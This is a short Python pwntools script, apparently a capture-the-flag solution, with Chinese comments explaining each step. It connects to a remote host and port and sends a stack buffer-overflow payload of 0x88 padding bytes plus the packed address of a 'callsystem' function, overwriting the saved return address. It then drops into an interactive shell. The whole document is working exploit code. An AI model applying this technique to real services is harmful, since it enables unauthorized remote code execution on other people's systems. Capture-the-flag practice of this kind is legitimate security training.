from pwn import *							
#p=process('./3-level0')#启动本地程序进行交互
p=remote('111.200.241.244','61154')
p.recvuntil("Hello, World\n")#接受程序发送的字符串
		
payload=('a'*0x88).encode()+p64(0x400596)#用88字节填充缓冲区,再将打包calsystem函数地址成64位覆盖rip位置，造成缓冲区溢出	
	
p.sendline(payload)#将payload发送给程序	
				
p.interactive()#进入交互界面	